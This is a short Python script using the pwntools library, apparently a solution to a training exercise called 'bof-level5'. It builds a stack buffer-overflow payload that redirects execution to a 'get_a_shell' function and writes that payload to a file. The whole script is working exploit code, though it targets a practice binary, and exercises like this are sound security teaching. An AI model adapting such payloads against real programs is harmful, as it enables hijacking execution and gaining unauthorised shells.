#!/usr/bin/env python
from pwn import	*

# stack offset to overwrite rip
stack_offset = 128
stack = p32(0xffffd488)
p = process("./bof-level5")

# load the program as an ELF object
e = ELF("./bof-level5")

# get the address of get_a_shell
shell_address = e.symbols['get_a_shell']

buffer = "A"*4 + p32(shell_address) + "B"*120 + stack

with open('pattern.txt', 'w') as f:
    f.write(buffer)
